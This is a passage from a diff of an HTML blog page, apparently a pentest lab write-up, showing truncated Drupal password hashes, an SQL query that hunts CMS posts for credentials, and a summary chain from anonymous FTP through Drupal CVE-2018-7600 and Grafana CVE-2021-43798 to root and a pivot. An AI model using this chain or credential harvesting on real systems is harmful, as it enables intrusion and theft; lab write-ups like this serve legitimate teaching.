 b.anes      $S$D3.zgIJy8cZvpPIERK9g3JFFsRMw...
 b.djawad    $S$Dal5fIRy2xWT.mawdvDUWEdbSd...
 h.raouf     $S$DRIAcOVxfnkZOkjU8Z4vTgxBVKAlFA0...
-</code></pre><p>I also queried the Drupal content for anything credential-related:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=n>n</span><span class=p>.</span><span class=n>title</span><span class=p>,</span><span class=w> </span><span class=n>u</span><span class=p>.</span><span class=n>name</span><span class=p>,</span><span class=w> </span><span class=n>b</span><span class=p>.</span><span class=n>body_value</span><span class=w>
-</span></span></span><span class=line><span class=cl><span class=k>FROM</span><span class=w> </span><span class=n>node</span><span class=w> </span><span class=n>n</span><span class=w>
-</span></span></span><span class=line><span class=cl><span class=k>LEFT</span><span class=w> </span><span class=k>JOIN</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=n>u</span><span class=w> </span><span class=k>ON</span><span class=w> </span><span class=n>u</span><span class=p>.</span><span class=n>uid</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>n</span><span class=p>.</span><span class=n>uid</span><span class=w>
-</span></span></span><span class=line><span class=cl><span class=k>LEFT</span><span class=w> </span><span class=k>JOIN</span><span class=w> </span><span class=n>field_data_body</span><span class=w> </span><span class=n>b</span><span class=w> </span><span class=k>ON</span><span class=w> </span><span class=n>b</span><span class=p>.</span><span class=n>entity_id</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>n</span><span class=p>.</span><span class=n>nid</span><span class=w>
-</span></span></span><span class=line><span class=cl><span class=k>WHERE</span><span class=w> </span><span class=k>LOWER</span><span class=p>(</span><span class=n>CONCAT_WS</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>,</span><span class=w> </span><span class=n>n</span><span class=p>.</span><span class=n>title</span><span class=p>,</span><span class=w> </span><span class=n>b</span><span class=p>.</span><span class=n>body_value</span><span class=p>))</span><span class=w>
-</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>REGEXP</span><span class=w> </span><span class=s1>&#39;password|passwd|pass|credential|creds|login|admin&#39;</span><span class=p>;</span><span class=w>
-</span></span></span></code></pre></div><p>This surfaced internal posts with hardcoded credentials in the CMS content, the kind of thing that happens in real orgs when people use the intranet as a shared notes app. These credentials fed directly into the next machine in the chain.</p><h2 id=summary>Summary</h2><pre tabindex=0><code>Anonymous FTP  → context + backup hint
+</code></pre><p>I also queried the Drupal content for anything credential-related:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">n</span><span class="p">.</span><span class="n">title</span><span class="p">,</span><span class="w"> </span><span class="n">u</span><span class="p">.</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">b</span><span class="p">.</span><span class="n">body_value</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="k">FROM</span><span class="w"> </span><span class="n">node</span><span class="w"> </span><span class="n">n</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="k">LEFT</span><span class="w"> </span><span class="k">JOIN</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="n">u</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="n">u</span><span class="p">.</span><span class="n">uid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">n</span><span class="p">.</span><span class="n">uid</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="k">LEFT</span><span class="w"> </span><span class="k">JOIN</span><span class="w"> </span><span class="n">field_data_body</span><span class="w"> </span><span class="n">b</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="n">b</span><span class="p">.</span><span class="n">entity_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">n</span><span class="p">.</span><span class="n">nid</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="k">WHERE</span><span class="w"> </span><span class="k">LOWER</span><span class="p">(</span><span class="n">CONCAT_WS</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span><span class="w"> </span><span class="n">n</span><span class="p">.</span><span class="n">title</span><span class="p">,</span><span class="w"> </span><span class="n">b</span><span class="p">.</span><span class="n">body_value</span><span class="p">))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">REGEXP</span><span class="w"> </span><span class="s1">&#39;password|passwd|pass|credential|creds|login|admin&#39;</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></div><p>This surfaced internal posts with hardcoded credentials in the CMS content, the kind of thing that happens in real orgs when people use the intranet as a shared notes app. These credentials fed directly into the next machine in the chain.</p>
+<h2 id="summary">Summary</h2>
+<pre tabindex="0"><code>Anonymous FTP  → context + backup hint
 Drupal 7.57    → CVE-2018-7600 → www-data shell
 www-data shell → localhost:3000 → Grafana 8.2.6
 Grafana        → CVE-2021-43798 → root SSH key → root
 Drupal DB      → credential harvest → pivot to .195
-</code></pre><p>Two CVEs, both pre-auth. The interesting design here was layering them: Drupal got you a shell, but Grafana got you directly to root without any local privesc. The credential harvest was what actually mattered for the larger pentest chain.</p><p>The backup SQLite in the FTP was a nice touch. It simulated the kind of thing that quietly accumulates in real corporate environments: automated backups accessible to anyone on the network, containing the entire application database.</p></div></article></main></div><script>function toggleToc(){const e=document.getElementById("tocContent"),t=document.querySelector(".toc-toggle");if(!e||!t)return;e.classList.toggle("expanded"),t.classList.toggle("expanded")}function toggleMiniToc(){const e=document.getElementById("miniToc");e&&e.classList.toggle("minimized")}function setupActiveHighlighting(e){const n=Array.from(e).map(e=>{const t=e.getAttribute("href");if(t&&t.startsWith("#")){const n=document.getElementById(decodeURIComponent(t.slice(1)));if(n)return{link:e,element:n}}return null}).filter(Boolean);if(n.length===0)return;function s(){const s=window.scrollY+100;let t=null;n.forEach(e=>{e.element.offsetTop<=s&&(t=e)}),e.forEach(e=>e.classList.remove("active")),t&&t.link.classList.add("active")}let t=!1;window.addEventListener("scroll",()=>{t||(requestAnimationFrame(()=>{s(),t=!1}),t=!0)}),s()}function initMiniToc(){const n=document.getElementById("miniToc"),s=document.getElementById("miniTocContent"),o=document.getElementById("tocContent");if(!n||!s||!o)return;const e=o.cloneNode(!0);e.classList.remove("toc-content","expanded"),e.removeAttribute("id");const t=e.querySelectorAll("a");if(t.length===0)return;t.forEach(e=>{e.addEventListener("click",t=>{const n=e.getAttribute("href");if(n&&n.startsWith("#")){const e=document.getElementById(decodeURIComponent(n.slice(1)));e&&(t.preventDefault(),e.scrollIntoView({behavior:"smooth",block:"start"}),history.pushState(null,"",n))}})}),s.appendChild(e),n.classList.add("visible"),setupActiveHighlighting(t)}document.addEventListener("DOMContentLoaded",initMiniToc)</script><footer class=footer><span class=footer_item></span>&nbsp;<div class=footer_social-icons><a href=https://discord.com/users/kanyo._ target=_blank rel="noopener noreferrer me" title=Discord><svg viewBox="20 15 205 190" fill="currentColor" stroke="none"><path d="M104.4 103.9c-5.7.0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7.0 10.2-5 10.2-11.1.1-6.1-4.5-11.1-10.2-11.1zm36.5.0c-5.7.0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7.0 10.2-5 10.2-11.1s-4.5-11.1-10.2-11.1z"/><path d="M189.5 20h-134C44.2 20 35 29.2 35 40.6v135.2c0 11.4 9.2 20.6 20.5 20.6h113.4l-5.3-18.5 12.8 11.9 12.1 11.2 21.5 19V40.6c0-11.4-9.2-20.6-20.5-20.6zm-38.6 130.6s-3.6-4.3-6.6-8.1c13.1-3.7 18.1-11.9 18.1-11.9-4.1 2.7-8 4.6-11.5 5.9-5 2.1-9.8 3.5-14.5 4.3-9.6 1.8-18.4 1.3-25.9-.1-5.7-1.1-10.6-2.7-14.7-4.3-2.3-.9-4.8-2-7.3-3.4-.3-.2-.6-.3-.9-.5-.2-.1-.3-.2-.4-.3-1.8-1-2.8-1.7-2.8-1.7s4.8 8 17.5 11.8c-3 3.8-6.7 8.3-6.7 8.3-22.1-.7-30.5-15.2-30.5-15.2.0-32.2 14.4-58.3 14.4-58.3 14.4-10.8 28.1-10.5 28.1-10.5l1 1.2c-18 5.2-26.3 13.1-26.3 13.1s2.2-1.2 5.9-2.9c10.7-4.7 19.2-6 22.7-6.3.6-.1 1.1-.2 1.7-.2 6.1-.8 13-1 20.2-.2 9.5 1.1 19.7 3.9 30.1 9.6.0.0-7.9-7.5-24.9-12.7l1.4-1.6s13.7-.3 28.1 10.5c0 0 14.4 26.1 14.4 58.3.0.0-8.5 14.5-30.6 15.2z"/></svg></a>
-<a href=https://github.com/Chaelsoo target=_blank rel="noopener noreferrer me" title=Github><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a>
-<a href=https://www.linkedin.com/in/abderrahmen-dellaa-a78517249/ target=_blank rel="noopener noreferrer me" title=Linkedin><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg></a>
-<a href=https://app.hackthebox.com/users/1490281 target=_blank rel="noopener noreferrer me" title=Hackthebox><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 1 2 6.5v11L12 23l10-5.5v-11L12 1z"/><path d="M12 12 2 6.5M12 12v11m0-11 10-5.5"/></svg></a></div><small class=footer_copyright>© 2026 .
-Powered by <a href=https://github.com/hugo-sid/hugo-blog-awesome target=_blank rel=noopener>Hugo blog awesome</a>.</small></footer><a href=# title="Go to top" id=totop><svg width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960"><path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197z"/></svg>
-</a><script src=https://chaelsoo.me/js/main.min.b09c6387b2f6ee79fac79c531b410d511da72f67534abd4435676936738db1e1.js integrity="sha256-sJxjh7L27nn6x5xTG0ENUR2nL2dTSr1ENWdpNnONseE="></script></body></html>
+</code></pre><p>Two CVEs, both pre-auth. The interesting design here was layering them: Drupal got you a shell, but Grafana got you directly to root without any local privesc. The credential harvest was what actually mattered for the larger pentest chain.</p>
+<p>The backup SQLite in the FTP was a nice touch. It simulated the kind of thing that quietly accumulates in real corporate environments: automated backups accessible to anyone on the network, containing the entire application database.</p>
+
+            </div>
+        </article></main>
+</div>
+
+<script>
+    function toggleToc() {
+        const content = document.getElementById('tocContent');
+        const button = document.querySelector('.toc-toggle');
+        if (!content || !button) return;
+        content.classList.toggle('expanded');
+        button.classList.toggle('expanded');
+    }
+
+    function toggleMiniToc() {
+        const miniToc = document.getElementById('miniToc');
+        if (miniToc) miniToc.classList.toggle('minimized');
+    }
+
+    function setupActiveHighlighting(links) {
+        const targets = Array.from(links).map(link => {
+            const href = link.getAttribute('href');
+            if (href && href.startsWith('#')) {
+                const el = document.getElementById(decodeURIComponent(href.slice(1)));
+                if (el) return { link, element: el };
+            }
+            return null;
+        }).filter(Boolean);
+
+        if (targets.length === 0) return;
+
+        function update() {
+            const scrollPosition = window.scrollY + 100;
+            let active = null;
+            targets.forEach(t => {
+                if (t.element.offsetTop <= scrollPosition) active = t;
+            });
+            links.forEach(l => l.classList.remove('active'));
+            if (active) active.link.classList.add('active');
+        }
+
+        let ticking = false;
+        window.addEventListener('scroll', () => {
+            if (!ticking) {
+                requestAnimationFrame(() => { update(); ticking = false; });
+                ticking = true;
+            }
+        });
+        update();
+    }
+
+    function initMiniToc() {
+        const miniToc = document.getElementById('miniToc');
+        const miniTocContent = document.getElementById('miniTocContent');
+        const sourceToc = document.getElementById('tocContent');
+        if (!miniToc || !miniTocContent || !sourceToc) return;
+
+        const clone = sourceToc.cloneNode(true);
+        clone.classList.remove('toc-content', 'expanded');
+        clone.removeAttribute('id');
+
+        const links = clone.querySelectorAll('a');
+        if (links.length === 0) return;
+
+        links.forEach(link => {
+            link.addEventListener('click', (e) => {
+                const href = link.getAttribute('href');
+                if (href && href.startsWith('#')) {
+                    const target = document.getElementById(decodeURIComponent(href.slice(1)));
+                    if (target) {
+                        e.preventDefault();
+                        target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                        history.pushState(null, '', href);
+                    }
+                }
+            });
+        });
+
+        miniTocContent.appendChild(clone);
+        miniToc.classList.add('visible');
+        setupActiveHighlighting(links);
+    }
+
+    document.addEventListener('DOMContentLoaded', initMiniToc);
+</script>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://discord.com/users/kanyo._" target="_blank" rel="noopener noreferrer me"
+    title="Discord"><svg xmlns="http://www.w3.org/2000/svg" viewBox="20 15 205 190" fill="currentColor" stroke="none">
+    <path
+        d="M104.4 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1.1-6.1-4.5-11.1-10.2-11.1zM140.9 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1s-4.5-11.1-10.2-11.1z" />
+    <path
+        d="M189.5 20h-134C44.2 20 35 29.2 35 40.6v135.2c0 11.4 9.2 20.6 20.5 20.6h113.4l-5.3-18.5 12.8 11.9 12.1 11.2 21.5 19V40.6c0-11.4-9.2-20.6-20.5-20.6zm-38.6 130.6s-3.6-4.3-6.6-8.1c13.1-3.7 18.1-11.9 18.1-11.9-4.1 2.7-8 4.6-11.5 5.9-5 2.1-9.8 3.5-14.5 4.3-9.6 1.8-18.4 1.3-25.9-.1-5.7-1.1-10.6-2.7-14.7-4.3-2.3-.9-4.8-2-7.3-3.4-.3-.2-.6-.3-.9-.5-.2-.1-.3-.2-.4-.3-1.8-1-2.8-1.7-2.8-1.7s4.8 8 17.5 11.8c-3 3.8-6.7 8.3-6.7 8.3-22.1-.7-30.5-15.2-30.5-15.2 0-32.2 14.4-58.3 14.4-58.3 14.4-10.8 28.1-10.5 28.1-10.5l1 1.2c-18 5.2-26.3 13.1-26.3 13.1s2.2-1.2 5.9-2.9c10.7-4.7 19.2-6 22.7-6.3.6-.1 1.1-.2 1.7-.2 6.1-.8 13-1 20.2-.2 9.5 1.1 19.7 3.9 30.1 9.6 0 0-7.9-7.5-24.9-12.7l1.4-1.6s13.7-.3 28.1 10.5c0 0 14.4 26.1 14.4 58.3 0 0-8.5 14.5-30.6 15.2z" />
+</svg></a>
+<a href="https://github.com/Chaelsoo" target="_blank" rel="noopener noreferrer me"
+    title="Github"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg></a>
+<a href="https://www.linkedin.com/in/abderrahmen-dellaa-a78517249/" target="_blank" rel="noopener noreferrer me"
+    title="Linkedin"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path>
+    <rect x="2" y="9" width="4" height="12"></rect>
+    <circle cx="4" cy="4" r="2"></circle>
+</svg></a>
+<a href="https://app.hackthebox.com/users/1490281" target="_blank" rel="noopener noreferrer me"
+    title="Hackthebox"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 1L2 6.5v11L12 23l10-5.5v-11L12 1z"></path><path d="M12 12L2 6.5M12 12v11M12 12l10-5.5"></path></svg></a>
+</div>
+    <small class="footer_copyright">
+        © 2026 .
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+
+
+
+
+    
+
+
+
+
+
+
+    
+    <script async src="http://localhost:1313/js/main.js"></script>
+
+    
+
+</body>
+</html>
